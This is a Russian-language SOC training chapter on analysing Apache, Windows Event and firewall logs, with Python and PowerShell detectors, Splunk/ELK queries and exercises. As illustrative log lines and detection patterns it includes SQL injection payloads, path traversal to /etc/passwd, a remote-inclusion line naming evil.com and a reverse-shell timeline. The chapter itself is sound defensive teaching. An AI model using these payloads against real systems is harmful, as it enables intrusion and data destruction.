# Глава 6.4: Анализ логов — Apache, Windows, Firewall

## 🎯 Цели главы

- Освоить форматы логов Apache/Nginx, Windows Event Log и Firewall-логов
- Научиться вручную и автоматически выявлять аномалии: брутфорс, сканирование, инъекции
- Понять принципы корреляции событий из разных источников
- Составлять поисковые запросы в Splunk и ELK Stack
- Строить детекционные правила на основе паттернов реальных атак

---

## 6.4.1 Почему лог-анализ — основа работы SOC

Логи — это цифровые следы всех действий в инфраструктуре. Без их анализа невозможно:
- обнаружить вторжение
- установить хронологию атаки
- собрать доказательную базу

По статистике Verizon DBIR, более **70% инцидентов** можно было выявить по имеющимся логам — но никто их не читал.

```
 Источники логов в типичной организации
 ═══════════════════════════════════════

 ┌─────────────┐   ┌─────────────┐   ┌─────────────┐
 │  Web-сервер │   │  Windows DC │   │   Firewall  │
 │ Apache/Nginx│   │  Event Logs │   │ iptables/ASA│
 └──────┬──────┘   └──────┬──────┘   └──────┬──────┘
        │                 │                 │
        └────────┬────────┘                 │
                 │         ┌────────────────┘
                 ▼         ▼
           ┌─────────────────┐
           │   SIEM / ELK    │
           │  (Splunk, etc.) │
           └────────┬────────┘
                    │
                    ▼
           ┌─────────────────┐
           │   SOC Analyst   │
           │   (L1 / L2)     │
           └─────────────────┘
```

---

## 6.4.2 Apache и Nginx: форматы access-логов

### Combined Log Format (Apache по умолчанию)

```
%h %l %u %t "%r" %>s %b "%{Referer}i" "%{User-Agent}i"
```

| Поле | Обозначение | Пример |
|------|-------------|--------|
| `%h` | IP клиента | `192.168.1.105` |
| `%l` | Ident (обычно `-`) | `-` |
| `%u` | Авторизованный юзер | `admin` или `-` |
| `%t` | Время запроса | `[25/Feb/2026:14:32:01 +0300]` |
| `%r` | Строка запроса | `GET /index.php HTTP/1.1` |
| `%>s` | HTTP-статус | `200`, `403`, `404` |
| `%b` | Размер ответа (байт) | `2048` |
| `Referer` | Откуда пришёл | `https://google.com` |
| `User-Agent` | Браузер/инструмент | `Mozilla/5.0 ...` |

### Пример строки лога

```
203.0.113.42 - - [25/Feb/2026:14:32:01 +0300] "GET /admin/login.php HTTP/1.1" 200 4823 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
```

Что сразу бросается в глаза:
- User-Agent: `sqlmap` — инструмент SQL-инъекций
- Путь: `/admin/login.php` — административный раздел
- Статус: `200` — запрос успешен

### Nginx access_log формат

```nginx
log_format main '$remote_addr - $remote_user [$time_local] "$request" '
                '$status $body_bytes_sent "$http_referer" '
                '"$http_user_agent" "$http_x_forwarded_for"';
```

Дополнительные поля Nginx:

```nginx
log_format detailed '$remote_addr - $remote_user [$time_local] '
                    '"$request" $status $bytes_sent '
                    '"$http_referer" "$http_user_agent" '
                    '$request_time $upstream_response_time '
                    '$pipe $connection_requests';
```

| Поле | Описание |
|------|----------|
| `$request_time` | Время обработки запроса (сек) |
| `$upstream_response_time` | Время ответа бэкенда |
| `$http_x_forwarded_for` | Реальный IP за прокси |

---

## 6.4.3 Apache Error Log

Формат error.log:

```
[Wed Feb 25 14:32:01.123456 2026] [error] [pid 1234] [client 203.0.113.42:54321] \
File does not exist: /var/www/html/wp-admin/admin-ajax.php
```

Структура:
```
[timestamp] [уровень] [pid] [client ip:port] сообщение
```

### Уровни severity в Apache

| Уровень | Значение |
|---------|----------|
| `emerg` | Система неработоспособна |
| `alert` | Требует немедленного вмешательства |
| `crit` | Критическое состояние |
| `error` | Ошибки (404, PHP Fatal) |
| `warn` | Предупреждения |
| `notice` | Нормальные значимые события |
| `info` | Информационные сообщения |
| `debug` | Отладочная информация |

### Характерные паттерны в error.log

```bash
# Попытки path traversal
[error] ... "GET /../../../../etc/passwd HTTP/1.1" ...

# PHP inclusion атаки
[error] ... Failed opening required '/var/www/html/http://evil.com/shell.txt'

# Превышение лимитов
[error] ... client denied by server configuration: /var/www/html/admin
```

---

## 6.4.4 Поиск аномалий в веб-логах

### Паттерн 1: Брутфорс аутентификации

```bash
# Пример: 500 запросов к /login за 1 минуту с одного IP
203.0.113.42 - - [25/Feb/2026:14:00:01] "POST /login HTTP/1.1" 401 234
203.0.113.42 - - [25/Feb/2026:14:00:02] "POST /login HTTP/1.1" 401 234
203.0.113.42 - - [25/Feb/2026:14:00:03] "POST /login HTTP/1.1" 401 234
...
203.0.113.42 - - [25/Feb/2026:14:00:58] "POST /login HTTP/1.1" 200 1823
```

Признаки брутфорса:
- Множество `401` / `403` с одного IP
- POST на `/login`, `/wp-login.php`, `/admin`
- Потом `200` — успешный вход

### Паттерн 2: Сканирование (reconnaissance)

```
# nikto / nmap HTTP scan
203.0.113.55 - - [25/Feb/2026:09:12:01] "GET /robots.txt HTTP/1.1" 200 67
203.0.113.55 - - [25/Feb/2026:09:12:01] "GET /.git/HEAD HTTP/1.1" 404 196
203.0.113.55 - - [25/Feb/2026:09:12:01] "GET /wp-login.php HTTP/1.1" 404 196
203.0.113.55 - - [25/Feb/2026:09:12:01] "GET /phpmyadmin/ HTTP/1.1" 404 196
203.0.113.55 - - [25/Feb/2026:09:12:02] "GET /admin/ HTTP/1.1" 403 289
203.0.113.55 - - [25/Feb/2026:09:12:02] "GET /.env HTTP/1.1" 404 196
203.0.113.55 - - [25/Feb/2026:09:12:02] "GET /backup.zip HTTP/1.1" 404 196
```

Признаки сканирования:
- Много `404` за короткое время
- Характерные пути (`.env`, `.git`, `backup`)
- User-Agent: `Nikto`, `Nmap Scripting Engine`, `DirBuster`

### Паттерн 3: SQL-инъекции в URL

```
# Примеры SQL-инъекций в access.log
GET /products.php?id=1'+OR+'1'%3D'1 HTTP/1.1
GET /search?q=1+UNION+SELECT+NULL,NULL,NULL-- HTTP/1.1
GET /user?id=1;DROP+TABLE+users-- HTTP/1.1
GET /page?id=1+AND+SLEEP(5)-- HTTP/1.1
GET /item?id=1'+AND+EXTRACTVALUE(1,CONCAT(0x7e,version()))-- HTTP/1.1
```

### Скрипт анализа access.log на Python

```python
#!/usr/bin/env python3
"""
Анализатор аномалий в Apache/Nginx access.log
"""

import re
import sys
from collections import defaultdict
from datetime import datetime

# Паттерны SQL-инъекций
SQL_PATTERNS = [
    r"union\s+select",
    r"or\s+1\s*=\s*1",
    r"drop\s+table",
    r"sleep\s*\(",
    r"extractvalue",
    r"benchmark\s*\(",
    r"information_schema",
    r"xp_cmdshell",
    r"waitfor\s+delay",
    r"--\s*$",
    r"'\s+or\s+'",
]

# Паттерны сканирования
SCAN_PATHS = [
    r"\.env$", r"\.git/", r"wp-login\.php", r"phpmyadmin",
    r"\.htaccess", r"backup\.(zip|tar|gz|sql)",
    r"/etc/passwd", r"/proc/self", r"\.bash_history",
]

# User-Agent сканеров
SCANNER_UA = [
    "sqlmap", "nikto", "nmap", "masscan", "zgrab",
    "dirbuster", "gobuster", "wfuzz", "burpsuite",
    "havij", "acunetix", "nessus", "openvas",
]

LOG_PATTERN = re.compile(
    r'(?P<ip>\S+) \S+ (?P<user>\S+) \[(?P<time>[^\]]+)\] '
    r'"(?P<method>\S+) (?P<path>\S+) \S+" '
    r'(?P<status>\d+) (?P<size>\S+) '
    r'"(?P<referer>[^"]*)" "(?P<ua>[^"]*)"'
)

def parse_log_line(line):
    m = LOG_PATTERN.match(line.strip())
    if not m:
        return None
    return m.groupdict()

def analyze_log(filepath):
    ip_stats = defaultdict(lambda: {
        "requests": 0, "errors": 0, "post_count": 0,
        "paths": [], "statuses": defaultdict(int)
    })
    alerts = []

    with open(filepath, "r", errors="replace") as f:
        for lineno, line in enumerate(f, 1):
            entry = parse_log_line(line)
            if not entry:
                continue

            ip = entry["ip"]
            stats = ip_stats[ip]
            stats["requests"] += 1
            stats["statuses"][entry["status"]] += 1

            if entry["status"].startswith(("4", "5")):
                stats["errors"] += 1

            if entry["method"] == "POST":
                stats["post_count"] += 1

            # Проверка User-Agent на сканеры
            ua_lower = entry["ua"].lower()
            for scanner in SCANNER_UA:
                if scanner in ua_lower:
                    alerts.append({
                        "line": lineno,
                        "type": "SCANNER_UA",
                        "severity": "HIGH",
                        "ip": ip,
                        "detail": f"Scanner UA detected: {scanner}",
                        "raw": line.strip()
                    })
                    break

            # Проверка SQL-инъекций
            path_decoded = entry["path"].lower().replace("%20", " ").replace("+", " ")
            for pattern in SQL_PATTERNS:
                if re.search(pattern, path_decoded, re.IGNORECASE):
                    alerts.append({
                        "line": lineno,
                        "type": "SQL_INJECTION",
                        "severity": "CRITICAL",
                        "ip": ip,
                        "detail": f"SQL injection pattern: {pattern}",
                        "raw": line.strip()
                    })
                    break

            # Проверка сканирования путей
            for scan_path in SCAN_PATHS:
                if re.search(scan_path, entry["path"], re.IGNORECASE):
                    alerts.append({
                        "line": lineno,
                        "type": "PATH_SCAN",
                        "severity": "MEDIUM",
                        "ip": ip,
                        "detail": f"Suspicious path: {entry['path']}",
                        "raw": line.strip()
                    })
                    break

    # Анализ на брутфорс (много 401/403 с одного IP)
    for ip, stats in ip_stats.items():
        auth_failures = stats["statuses"].get("401", 0) + stats["statuses"].get("403", 0)
        if auth_failures > 50:
            alerts.append({
                "line": 0,
                "type": "BRUTE_FORCE",
                "severity": "HIGH",
                "ip": ip,
                "detail": f"Auth failures: {auth_failures} (401: {stats['statuses'].get('401',0)}, 403: {stats['statuses'].get('403',0)})",
                "raw": f"Aggregate for IP {ip}"
            })

        # Много 404 = сканирование
        not_found = stats["statuses"].get("404", 0)
        if not_found > 100:
            alerts.append({
                "line": 0,
                "type": "DIRECTORY_SCAN",
                "severity": "MEDIUM",
                "ip": ip,
                "detail": f"404 count: {not_found}",
                "raw": f"Aggregate for IP {ip}"
            })

    return alerts, ip_stats

def print_report(alerts, ip_stats):
    print("\n" + "="*60)
    print("  ОТЧЁТ АНАЛИЗА ACCESS.LOG")
    print("="*60)

    # Статистика по IP
    print(f"\n[*] Топ-10 активных IP:")
    sorted_ips = sorted(ip_stats.items(), key=lambda x: x[1]["requests"], reverse=True)[:10]
    for ip, stats in sorted_ips:
        print(f"    {ip:20s} запросов: {stats['requests']:5d}  ошибок: {stats['errors']:4d}")

    # Алерты по severity
    critical = [a for a in alerts if a["severity"] == "CRITICAL"]
    high = [a for a in alerts if a["severity"] == "HIGH"]
    medium = [a for a in alerts if a["severity"] == "MEDIUM"]

    print(f"\n[!] Алерты: CRITICAL={len(critical)}, HIGH={len(high)}, MEDIUM={len(medium)}")

    for sev, color_code, alert_list in [
        ("CRITICAL", "\033[91m", critical),
        ("HIGH", "\033[93m", high),
        ("MEDIUM", "\033[94m", medium),
    ]:
        if alert_list:
            print(f"\n{color_code}[{sev}]\033[0m")
            for a in alert_list[:5]:  # первые 5
                print(f"  Строка {a['line']:5d} | IP: {a['ip']:20s} | {a['type']}")
                print(f"  Детали: {a['detail']}")
                print(f"  Лог: {a['raw'][:100]}...")
                print()

if __name__ == "__main__":
    logfile = sys.argv[1] if len(sys.argv) > 1 else "/var/log/apache2/access.log"
    alerts, ip_stats = analyze_log(logfile)
    print_report(alerts, ip_stats)
```

---

## 6.4.5 Windows Event Log: структура и ключевые события

### Формат Windows Event Log

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{...}"/>
    <EventID>4624</EventID>
    <Version>2</Version>
    <Level>0</Level>
    <Task>12544</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8020000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-25T11:32:01.123456700Z"/>
    <EventRecordID>1234567</EventRecordID>
    <Channel>Security</Channel>
    <Computer>DC01.corp.local</Computer>
  </System>
  <EventData>
    <Data Name="SubjectUserName">SYSTEM</Data>
    <Data Name="TargetUserName">john.doe</Data>
    <Data Name="LogonType">3</Data>
    <Data Name="IpAddress">192.168.1.105</Data>
    <Data Name="IpPort">54321</Data>
  </EventData>
</Event>
```

### Критически важные Event ID для SOC

#### Security Log

| Event ID | Описание | Важность |
|----------|----------|----------|
| 4624 | Успешный вход | MEDIUM |
| 4625 | Неудачный вход | HIGH |
| 4634 | Выход из системы | LOW |
| 4648 | Вход с явными учётными данными (runas) | HIGH |
| 4672 | Вход с привилегиями администратора | HIGH |
| 4688 | Создание нового процесса | HIGH |
| 4697 | Установка нового сервиса | CRITICAL |
| 4698 | Создание scheduled task | HIGH |
| 4720 | Создание учётной записи | HIGH |
| 4722 | Включение учётной записи | MEDIUM |
| 4723 | Смена пароля (пользователем) | MEDIUM |
| 4724 | Сброс пароля (администратором) | HIGH |
| 4728 | Добавление в группу безопасности | HIGH |
| 4732 | Добавление в локальные администраторы | CRITICAL |
| 4756 | Добавление в универсальную группу | HIGH |
| 4768 | Kerberos TGT запрошен | MEDIUM |
| 4769 | Kerberos service ticket запрошен | MEDIUM |
| 4771 | Kerberos pre-auth failure | HIGH |
| 4776 | NTLM аутентификация | MEDIUM |
| 4798 | Перечисление локальных групп пользователя | HIGH |
| 4799 | Перечисление членов группы | HIGH |
| 7045 | Новый сервис установлен в системе | CRITICAL |

#### System Log

| Event ID | Описание |
|----------|----------|
| 7034 | Сервис завершился неожиданно |
| 7036 | Сервис изменил состояние |
| 7040 | Тип запуска сервиса изменён |
| 104 | Журнал событий очищен (!) |
| 1102 | Audit log очищен (!) |

### Logon Types — расшифровка

| Тип | Описание | Подозрительность |
|-----|----------|-----------------|
| 2 | Интерактивный (физический) | Норма |
| 3 | Network (SMB, RPC) | Требует внимания |
| 4 | Batch (scheduled task) | Норма |
| 5 | Service logon | Норма |
| 7 | Unlock workstation | Норма |
| 8 | NetworkCleartext (IIS basic auth) | Высокая |
| 9 | NewCredentials (runas /netonly) | Высокая |
| 10 | RemoteInteractive (RDP) | Высокая |
| 11 | CachedInteractive (offline login) | Средняя |

---

## 6.4.6 Анализ Windows-логов: PowerShell примеры

### Получение событий через PowerShell

```powershell
# Все неудачные входы за последние 24 часа
$StartTime = (Get-Date).AddHours(-24)
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    Id = 4625
    StartTime = $StartTime
} | Select-Object TimeCreated, Id, Message | Format-List

# Брутфорс: группировка по IP
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    Id = 4625
    StartTime = $StartTime
} | ForEach-Object {
    $xml = [xml]$_.ToXml()
    $ip = ($xml.Event.EventData.Data | Where-Object { $_.Name -eq 'IpAddress' }).'#text'
    $user = ($xml.Event.EventData.Data | Where-Object { $_.Name -eq 'TargetUserName' }).'#text'
    [PSCustomObject]@{
        Time = $_.TimeCreated
        IP = $ip
        User = $user
    }
} | Group-Object IP | Sort-Object Count -Descending | Select-Object -First 10 |
    Format-Table Name, Count -AutoSize

# Создание новых учётных записей
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    Id = 4720
    StartTime = $StartTime
} | ForEach-Object {
    $xml = [xml]$_.ToXml()
    [PSCustomObject]@{
        Time = $_.TimeCreated
        NewUser = ($xml.Event.EventData.Data | Where-Object { $_.Name -eq 'TargetUserName' }).'#text'
        CreatedBy = ($xml.Event.EventData.Data | Where-Object { $_.Name -eq 'SubjectUserName' }).'#text'
    }
} | Format-Table -AutoSize

# Очистка журналов (критично!)
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    Id = @(1102, 104)
} | Select-Object TimeCreated, Id, Message
```

### Python-скрипт для разбора EVTX-файлов

```python
#!/usr/bin/env python3
"""
Анализ Windows EVTX через python-evtx
pip install python-evtx lxml
"""

import Evtx.Evtx as evtx
import Evtx.Views as e_views
from lxml import etree
from collections import defaultdict
import json

NAMESPACE = "http://schemas.microsoft.com/win/2004/08/events/event"

CRITICAL_EVENTS = {
    4625: "Failed Logon",
    4624: "Successful Logon",
    4648: "Logon with Explicit Credentials",
    4697: "Service Installed",
    4698: "Scheduled Task Created",
    4720: "User Account Created",
    4732: "User Added to Local Admins",
    7045: "New Service Installed",
    1102: "Audit Log Cleared",
    104:  "Event Log Cleared",
}

def get_data_value(event_data, name):
    """Извлечь значение поля из EventData."""
    for data in event_data:
        if data.get("Name") == name:
            return data.text or ""
    return ""

def parse_evtx(filepath):
    results = []
    
    with evtx.Evtx(filepath) as log:
        for record in log.records():
            try:
                root = etree.fromstring(record.xml())
                ns = {"e": NAMESPACE}
                
                event_id_elem = root.find(".//e:EventID", ns)
                if event_id_elem is None:
                    continue
                
                event_id = int(event_id_elem.text)
                if event_id not in CRITICAL_EVENTS:
                    continue
                
                time_elem = root.find(".//e:TimeCreated", ns)
                time_str = time_elem.get("SystemTime", "") if time_elem is not None else ""
                
                channel_elem = root.find(".//e:Channel", ns)
                channel = channel_elem.text if channel_elem is not None else ""
                
                computer_elem = root.find(".//e:Computer", ns)
                computer = computer_elem.text if computer_elem is not None else ""
                
                event_data = root.findall(".//e:Data", ns)
                
                entry = {
                    "event_id": event_id,
                    "description": CRITICAL_EVENTS[event_id],
                    "time": time_str,
                    "channel": channel,
                    "computer": computer,
                }
                
                # Специфические поля для разных событий
                if event_id in (4624, 4625, 4648):
                    entry["target_user"] = get_data_value(event_data, "TargetUserName")
                    entry["subject_user"] = get_data_value(event_data, "SubjectUserName")
                    entry["logon_type"] = get_data_value(event_data, "LogonType")
                    entry["ip_address"] = get_data_value(event_data, "IpAddress")
                    entry["workstation"] = get_data_value(event_data, "WorkstationName")
                
                elif event_id in (4720, 4732):
                    entry["target_user"] = get_data_value(event_data, "TargetUserName")
                    entry["created_by"] = get_data_value(event_data, "SubjectUserName")
                    entry["group"] = get_data_value(event_data, "TargetSid")
                
                elif event_id in (4697, 7045):
                    entry["service_name"] = get_data_value(event_data, "ServiceName")
                    entry["service_file"] = get_data_value(event_data, "ServiceFileName")
                    entry["service_type"] = get_data_value(event_data, "ServiceType")
                
                results.append(entry)
                
            except Exception as e:
                continue
    
    return results

def detect_brute_force(events):
    """Выявление брутфорса по событию 4625."""
    failures = defaultdict(list)
    
    for ev in events:
        if ev["event_id"] == 4625:
            ip = ev.get("ip_address", "unknown")
            failures[ip].append(ev)
    
    alerts = []
    for ip, evs in failures.items():
        if len(evs) >= 10:
            alerts.append({
                "type": "BRUTE_FORCE",
                "severity": "HIGH",
                "ip": ip,
                "count": len(evs),
                "first": evs[0]["time"],
                "last": evs[-1]["time"],
                "targets": list(set(e.get("target_user","") for e in evs))
            })
    return alerts

if __name__ == "__main__":
    import sys
    filepath = sys.argv[1] if len(sys.argv) > 1 else "Security.evtx"
    
    print(f"[*] Анализируем: {filepath}")
    events = parse_evtx(filepath)
    print(f"[*] Найдено критических событий: {len(events)}")
    
    bf_alerts = detect_brute_force(events)
    if bf_alerts:
        print(f"\n[!] Обнаружен брутфорс ({len(bf_alerts)} источников):")
        for a in bf_alerts:
            print(f"    IP: {a['ip']:20s} попыток: {a['count']:4d}  цели: {a['targets']}")
    
    # Вывод критических событий
    for ev in sorted(events, key=lambda x: x["time"])[-20:]:
        print(f"[{ev['event_id']}] {ev['time'][:19]} | {ev['description'][:30]:30s} | {ev.get('target_user','')}")
```

---

## 6.4.7 Firewall логи: iptables

### Формат iptables лога

```
Feb 25 14:32:01 fw01 kernel: [1234567.890] DROPPED IN=eth0 OUT= \
  MAC=00:11:22:33:44:55:66:77:88:99:aa:bb:cc:dd \
  SRC=203.0.113.42 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 \
  TTL=50 ID=12345 DF PROTO=TCP SPT=54321 DPT=22 \
  WINDOW=65535 RES=0x00 SYN URGP=0
```

### Поля iptables лога

| Поле | Описание |
|------|----------|
| `IN=eth0` | Входящий интерфейс |
| `OUT=eth1` | Исходящий интерфейс |
| `SRC=` | IP источника |
| `DST=` | IP назначения |
| `PROTO=TCP` | Протокол |
| `SPT=` | Порт источника |
| `DPT=` | Порт назначения |
| `SYN` | TCP-флаги |
| `WINDOW=` | Размер окна TCP |
| `TTL=` | Time to Live |

### Настройка логирования iptables

```bash
# Добавить правила логирования ПЕРЕД DROP/REJECT
iptables -I INPUT -j LOG --log-prefix "DROPPED " --log-level 4
iptables -I FORWARD -j LOG --log-prefix "FORWARD_DROP " --log-level 4

# Логировать сканирование портов (SYN без ACK)
iptables -A INPUT -p tcp --tcp-flags ALL SYN -m limit --limit 1/s \
  -j LOG --log-prefix "PORT_SCAN " --log-level 4

# Сохранить правила
iptables-save > /etc/iptables/rules.v4
```

### Анализ iptables лога

```bash
# Топ-10 IP по дропам
grep "DROPPED" /var/log/kern.log | \
  grep -oP 'SRC=\K[\d.]+' | \
  sort | uniq -c | sort -rn | head -10

# Популярные порты назначения (атакуемые сервисы)
grep "DROPPED" /var/log/kern.log | \
  grep -oP 'DPT=\K\d+' | \
  sort | uniq -c | sort -rn | head -20

# SYN flood с одного IP
grep "DROPPED" /var/log/kern.log | \
  grep "SYN" | \
  grep -oP 'SRC=\K[\d.]+' | \
  sort | uniq -c | sort -rn | head -5
```

---

## 6.4.8 Firewall логи: pfSense и Cisco ASA

### pfSense лог (filterlog)

```
Feb 25 14:32:01 pfSense filterlog[1234]: \
  6,,,1000000103,em0,match,block,in,4,0x0,,50,12345,0,DF,6,tcp,60, \
  203.0.113.42,10.0.0.1,54321,22,0,S,0,,65535,6,1460
```

Разбивка по полям:
```
rule_number, subrule, anchor, tracker, interface, reason, action, direction,
ip_version, tos, ecn, ttl, id, offset, flags, proto_id, proto_name, length,
src_ip, dst_ip, src_port, dst_port, data_len, tcp_flags, seq, ack, window,
urg, options
```

### Cisco ASA лог

```
%ASA-4-106023: Deny tcp src outside:203.0.113.42/54321 \
  dst inside:10.0.0.10/80 by access-group "outside_access_in" [0x0, 0x0]

%ASA-6-302013: Built inbound TCP connection 123456 for \
  outside:203.0.113.42/54321 (203.0.113.42/54321) to \
  inside:10.0.0.10/443 (10.0.0.10/443)

%ASA-4-733100: Object drop threshold exceeded for tcp scanning, current rate: 50/s
```

### Severity коды Cisco ASA

| Код | Уровень |
|-----|---------|
| 0 | Emergency |
| 1 | Alert |
| 2 | Critical |
| 3 | Error |
| 4 | Warning |
| 5 | Notification |
| 6 | Informational |
| 7 | Debugging |

### Важные Message ID Cisco ASA

| Message ID | Описание |
|------------|----------|
| 106001, 106006, 106023 | ACL deny |
| 302013, 302014 | TCP connection built/torn down |
| 302015, 302016 | UDP connection |
| 305011, 305012 | NAT translation |
| 402116, 402117 | IPSEC |
| 733100 | Scanning threat detected |
| 733101 | Host detected as scanning |
| 710003 | TCP access denied |

---

## 6.4.9 Корреляция событий из разных источников

Корреляция — ключевой навык SOC. Одно событие ничего не значит; совпадение нескольких — инцидент.

```
 Пример корреляции: компрометация веб-сервера
 ═════════════════════════════════════════════

 14:30:00  Firewall    SRC=203.0.113.42 → DST=10.0.0.10:80 ALLOW
           │
           ▼
 14:30:01  Apache      GET /login.php → 401 (попытка 1 из 500)
 14:30:58  Apache      POST /login.php → 200 (вход успешен!)
           │
           ▼
 14:31:00  Apache      GET /admin/upload.php → 200
 14:31:05  Apache      POST /admin/upload.php → 200 (загрузка файла)
           │
           ▼
 14:31:10  Windows     EventID 4688: новый процесс cmd.exe
                       Parent: php-cgi.exe (!)
           │
           ▼
 14:31:15  Firewall    SRC=10.0.0.10 → DST=203.0.113.42:4444 ALLOW
                       (обратное соединение — reverse shell!)
           │
           ▼
 14:31:20  Windows     EventID 4720: создан новый пользователь "svc_backup"
 14:31:25  Windows     EventID 4732: svc_backup добавлен в Administrators
```

Один аналитик, наблюдающий только один источник, ничего не заметит. SIEM с корреляцией — заметит всё.

---

## 6.4.10 Запросы в Splunk

### Базовый синтаксис Splunk SPL

```spl
index=web_logs sourcetype=access_combined
| stats count by clientip
| sort -count
| head 20
```

### Обнаружение брутфорса (Apache)

```spl
index=web_logs sourcetype=access_combined
    (status=401 OR status=403)
    uri_path="/login*"
| bucket _time span=5m
| stats count as failures by clientip, _time
| where failures > 20
| eval severity=case(failures>100,"CRITICAL", failures>50,"HIGH", true(),"MEDIUM")
| table _time, clientip, failures, severity
| sort -failures
```

### Обнаружение SQL-инъекций

```spl
index=web_logs sourcetype=access_combined
| eval uri_lower=lower(uri_query)
| where match(uri_lower, "union\s+select|or\s+1=1|drop\s+table|sleep\s*\(|benchmark\s*\(|xp_cmdshell|information_schema")
| stats count by clientip, uri_path, uri_query
| sort -count
```

### Обнаружение сканирования

```spl
index=web_logs sourcetype=access_combined status=404
| bucket _time span=1m
| stats count as not_found by clientip, _time
| where not_found > 50
| join clientip [
    search index=web_logs sourcetype=access_combined status=404
    | stats dc(uri_path) as unique_paths by clientip
]
| where unique_paths > 30
| table clientip, _time, not_found, unique_paths
```

### Корреляция Windows + Web

```spl
index=windows_logs EventCode=4625
| eval src_ip=IpAddress
| join src_ip [
    search index=web_logs sourcetype=access_combined (status=401 OR status=403)
    | rename clientip as src_ip
    | stats count as web_failures by src_ip
]
| stats count as win_failures, values(web_failures) as web_failures by src_ip
| where win_failures > 10 AND web_failures > 10
| eval combined_score=win_failures+web_failures
| sort -combined_score
```

### Обнаружение очистки логов

```spl
index=windows_logs (EventCode=1102 OR EventCode=104)
| table _time, host, user, EventCode, Message
| eval alert="LOG CLEARED - CRITICAL"
| sort _time
```

---

## 6.4.11 Запросы в ELK (Elasticsearch + Kibana)

### Elasticsearch Query DSL

```json
// Брутфорс: много 401 с одного IP
POST /apache-logs-*/_search
{
  "query": {
    "bool": {
      "must": [
        { "term": { "response": 401 } },
        { "range": { "@timestamp": { "gte": "now-1h" } } }
      ]
    }
  },
  "aggs": {
    "by_ip": {
      "terms": {
        "field": "clientip",
        "size": 20,
        "order": { "_count": "desc" }
      },
      "aggs": {
        "count": { "value_count": { "field": "clientip" } }
      }
    }
  },
  "size": 0
}
```

```json
// SQL-инъекции в URI
POST /apache-logs-*/_search
{
  "query": {
    "bool": {
      "should": [
        { "match_phrase": { "request": "UNION SELECT" } },
        { "match_phrase": { "request": "OR 1=1" } },
        { "regexp": { "request": ".*sleep\\s*\\(.*" } },
        { "match_phrase": { "request": "information_schema" } }
      ],
      "minimum_should_match": 1,
      "filter": [
        { "range": { "@timestamp": { "gte": "now-24h" } } }
      ]
    }
  },
  "_source": ["@timestamp", "clientip", "request", "response"],
  "sort": [{ "@timestamp": { "order": "desc" } }]
}
```

### Logstash pipeline для Apache

```ruby
# /etc/logstash/conf.d/apache.conf
input {
  file {
    path => "/var/log/apache2/access.log"
    start_position => "beginning"
    sincedb_path => "/var/lib/logstash/sincedb_apache"
    type => "apache_access"
  }
}

filter {
  grok {
    match => {
      "message" => '%{COMBINEDAPACHELOG}'
    }
  }
  
  date {
    match => ["timestamp", "dd/MMM/yyyy:HH:mm:ss Z"]
    target => "@timestamp"
  }
  
  geoip {
    source => "clientip"
    target => "geoip"
  }
  
  useragent {
    source => "agent"
    target => "ua"
  }
  
  # Определить тип атаки
  if [request] =~ /union\s+select/i {
    mutate { add_tag => ["sql_injection", "attack"] }
  }
  if [agent] =~ /sqlmap|nikto|nmap/i {
    mutate { add_tag => ["scanner", "attack"] }
  }
  if [response] == "401" {
    mutate { add_tag => ["auth_failure"] }
  }
  
  mutate {
    convert => { "response" => "integer" "bytes" => "integer" }
  }
}

output {
  elasticsearch {
    hosts => ["localhost:9200"]
    index => "apache-logs-%{+YYYY.MM.dd}"
  }
  
  # Отдельный индекс для атак
  if "attack" in [tags] {
    elasticsearch {
      hosts => ["localhost:9200"]
      index => "security-alerts-%{+YYYY.MM.dd}"
    }
  }
}
```

### Kibana: создание дашборда безопасности

```
 Дашборд "Security Overview" в Kibana
 ════════════════════════════════════════

 ┌──────────────────────┬──────────────────────┐
 │  Auth Failures/hour  │   Top Attack IPs     │
 │  [Line chart]        │   [Data table]       │
 │  ████▓▓▒▒░░         │   1. 203.0.113.42    │
 │                      │   2. 198.51.100.17   │
 └──────────────────────┴──────────────────────┘
 ┌──────────────────────┬──────────────────────┐
 │  Attack Types        │  Geographic Map      │
 │  [Pie chart]         │  [Tile map]          │
 │  SQL Inj: 45%       │  ·· RU ··· CN ·      │
 │  Brute: 30%         │  · US ·· UA ·        │
 │  Scan: 25%          │                      │
 └──────────────────────┴──────────────────────┘
```

---

## 6.4.12 Практические упражнения

### Упражнение 1: Найди атакующего

Дан фрагмент access.log. Определите:
1. IP атакующего
2. Тип атаки
3. Успешна ли атака

```
198.51.100.77 - - [25/Feb/2026:10:00:01] "GET /index.php HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
198.51.100.77 - - [25/Feb/2026:10:00:02] "GET /login.php HTTP/1.1" 200 4512 "-" "Mozilla/5.0"
198.51.100.77 - - [25/Feb/2026:10:00:03] "POST /login.php HTTP/1.1" 401 234 "-" "Mozilla/5.0"
198.51.100.77 - - [25/Feb/2026:10:00:04] "POST /login.php HTTP/1.1" 401 234 "-" "Mozilla/5.0"
[... 847 строк аналогичных ...]
198.51.100.77 - - [25/Feb/2026:10:08:34] "POST /login.php HTTP/1.1" 302 0 "-" "Mozilla/5.0"
198.51.100.77 - - [25/Feb/2026:10:08:35] "GET /admin/dashboard.php HTTP/1.1" 200 8923 "-" "Mozilla/5.0"
198.51.100.77 - - [25/Feb/2026:10:08:40] "POST /admin/upload.php HTTP/1.1" 200 512 "-" "Mozilla/5.0"
```

**Ответ:**
- IP: `198.51.100.77`
- Тип: брутфорс + загрузка файла
- Успех: да (302 → redirect на dashboard, затем upload)

### Упражнение 2: SPL-запрос

Напишите Splunk-запрос, который находит IP-адреса, совершившие более 5 неудачных попыток входа (EventID 4625) за 10 минут, с последующим успешным входом (EventID 4624).

```spl
// Решение
index=windows_logs (EventCode=4625 OR EventCode=4624)
| eval event_type=case(EventCode=4625, "failure", EventCode=4624, "success")
| bucket _time span=10m
| stats count(eval(event_type="failure")) as failures,
        count(eval(event_type="success")) as successes
        by IpAddress, _time
| where failures > 5 AND successes > 0
| eval alert="Brute Force + Successful Login"
| table _time, IpAddress, failures, successes, alert
| sort -failures
```

---

## 📌 Итоги главы

